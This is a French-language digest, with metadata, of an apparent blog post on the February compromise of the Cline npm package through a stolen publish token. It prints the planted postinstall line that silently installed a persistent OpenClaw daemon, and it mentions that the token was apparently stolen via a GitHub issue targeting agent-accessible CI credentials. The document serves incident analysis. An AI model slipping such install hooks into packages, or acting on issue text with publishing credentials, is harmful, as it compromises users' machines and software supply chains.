---
title: "How to steal npm publish tokens by opening GitHub issues"
date: 2026-03-11
url: https://neciudan.dev/cline-ci-got-compromised-here-is-how
authors: [neciudan.dev]
keywords: [supply chain, npm, sécurité, Cline, OpenClaw, CI/CD]
theme: IA
tone: opinion
used_in: ["2026-03-11"]
---

## Résumé

Un développeur détaille comment le projet Cline — un assistant de code IA utilisé par 5 millions de personnes — a été compromis via le vol d'un token de publication npm. L'attaquant a publié une version piégée (cline@2.3.0) qui installait silencieusement OpenClaw en daemon sur les machines des utilisateurs. 4 000 installations en 8 heures avant détection. Le vecteur d'attaque : un simple GitHub issue, exploitant des pipelines CI/CD non conçus pour un monde d'agents autonomes.

## Points clés

- Le 17 février, quelqu'un a publié `cline@2.3.0` sur npm avec un token de publication volé
- La seule modification : une ligne `postinstall` qui installait OpenClaw globalement en tant que daemon
- 4 000 installations en 8 heures avant que les mainteneurs ne détectent et publient une version propre (2.4.0)
- OpenClaw n'est pas un malware en soi — c'est un agent IA légitime avec 160 000+ étoiles GitHub
- Le daemon s'enregistre en tant que service launchd (macOS) ou systemd (Linux) et persiste après redémarrage
- Le vecteur d'attaque était un simple GitHub issue, pas un exploit sophistiqué
- L'incident illustre que les pipelines CI/CD n'ont pas été pensés pour un monde où des agents accèdent aux credentials

## Analyse approfondie

Cline, si vous ne le connaissez pas, est un assistant de code IA open source. Il compte plus de 5 millions d'utilisateurs sur VS Code et JetBrains, et c'est l'un des outils que les gens utilisent réellement au quotidien pour le développement assisté par IA. Il a aussi une version CLI publiée sur npm.

Le 17 février, quelqu'un a publié `cline@2.3.0` sur npm en utilisant un token de publication volé. La seule chose modifiée dans le package était une ligne dans `package.json` :

```
"postinstall": "npm install -g openclaw@latest"
```

La version piégée est restée en ligne pendant 8 heures. Environ 4 000 installations avant que les mainteneurs ne détectent le problème et publient une version propre 2.4.0.

### Qu'est-ce qu'OpenClaw ?

OpenClaw (anciennement Clawdbot, puis Moltbot) a dépassé les 160 000 étoiles GitHub début 2026. Peter Steinberger, le créateur, a été recruté par OpenAI. Les gens achètent des Mac Mini spécifiquement pour les faire tourner 24/7 comme assistant IA personnel.

OpenClaw est un logiciel légitimement intéressant. On l'installe, il tourne en daemon en arrière-plan, et on lui parle via WhatsApp, Telegram ou iMessage. Il lit des fichiers, exécute des commandes terminal, navigue sur le web et gère des tâches. Le Mac Mini M4 de base consomme 5-7 watts au repos, coûte environ 1-2$/mois en électricité, et on a un butler IA personnel sur son bureau.

OpenClaw n'est donc pas un malware, ce qui change la nature de l'attaque sur Cline.

### Ce que la ligne postinstall fait réellement

Quand les rapports disent "un malware a été installé", ils signifient que le hook postinstall a exécuté `npm install -g openclaw@latest`, installant la CLI OpenClaw globalement et enregistrant son daemon Gateway. Sur macOS, c'est un service launchd ; sur Linux, un service systemd. Le daemon tourne sur `ws://127.0.0.1:18789` et persiste après redémarrage.

### Le vrai problème

L'incident illustre un problème fondamental : les pipelines CI/CD et les systèmes de publication npm n'ont pas été conçus pour un monde où des agents autonomes peuvent accéder aux credentials de publication. Le token était accessible, l'attaquant l'a pris via un vecteur aussi simple qu'un GitHub issue, et personne n'a rien vu pendant 8 heures.

## Pourquoi ça compte

Cet incident est un cas d'école de la convergence entre supply chain attacks et ère agentique : quand des agents IA ont un accès complet aux systèmes de développement, la surface d'attaque s'étend de manière exponentielle — et les mécanismes de défense actuels ne suivent pas.
